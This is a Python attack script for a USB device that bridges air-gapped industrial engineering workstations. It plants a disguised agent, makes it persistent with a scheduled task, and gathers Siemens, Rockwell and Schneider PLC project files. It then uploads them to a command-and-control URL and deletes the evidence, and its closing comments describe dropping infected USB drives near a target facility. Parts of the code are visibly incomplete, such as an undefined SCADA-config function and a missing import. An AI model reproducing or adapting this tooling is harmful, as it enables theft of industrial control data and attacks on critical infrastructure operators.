# usb_airgap_bridge.py - Automated air-gap bridging via USB
# Deploy on Rubber Ducky or similar USB attack device

class USBAirGapBridge:
    def __init__(self):
        self.staging_area = "E:\\staged_data"  # USB drive
        self.target_path = "C:\\Users\\Engineer\\Documents"

    def deploy_agent(self):
        """
        When USB plugged into air-gapped EWS, deploy agent
        """
        import shutil
        import subprocess

        # Copy agent to target system
        agent_source = f"{self.staging_area}\\system_update.exe"
        agent_dest = f"{self.target_path}\\system_update.exe"

        shutil.copy(agent_source, agent_dest)

        # Establish persistence
        subprocess.call(f'schtasks /create /tn "SystemUpdate" /tr "{agent_dest}" /sc daily /st 02:00')

        print("[+] Agent deployed on air-gapped system")

    def collect_data(self):
        """
        Collect data from air-gapped network to USB
        Next time USB is connected to internet-connected system, exfiltrate
        """
        import os
        import zipfile

        # Locate valuable data
        plc_projects = self.find_plc_projects()
        scada_configs = self.find_scada_configs()

        # Zip and copy to USB
        with zipfile.ZipFile(f"{self.staging_area}\\collected_data.zip", 'w') as zf:
            for file in plc_projects + scada_configs:
                zf.write(file, os.path.basename(file))

        print(f"[+] Collected {len(plc_projects) + len(scada_configs)} files to USB")

    def find_plc_projects(self):
        """
        Locate PLC project files
        """
        import glob

        project_patterns = [
            "C:\\Users\\*\\Documents\\Siemens\\*.ap17",  # TIA Portal
            "C:\\Users\\*\\Documents\\Rockwell\\*.ACD",  # RSLogix 5000
            "C:\\Users\\*\\Documents\\Schneider\\*.STU"  # Unity Pro
        ]

        files = []
        for pattern in project_patterns:
            files.extend(glob.glob(pattern))

        return files

    def bridge_to_internet(self):
        """
        When USB plugged into internet-connected system, exfiltrate
        """
        import requests

        collected_data = f"{self.staging_area}\\collected_data.zip"

        if os.path.exists(collected_data):
            with open(collected_data, 'rb') as f:
                files = {'file': f}
                requests.post("https://c2.com/upload", files=files)

            print("[+] Data exfiltrated via USB bridge")

            # Delete evidence
            os.remove(collected_data)

# Deployment:
# 1. Leave infected USB drives near target facility
# 2. Engineer finds USB, plugs into air-gapped EWS
# 3. Agent deploys and collects data
# 4. Engineer later plugs USB into IT laptop
# 5. Data automatically exfiltrated
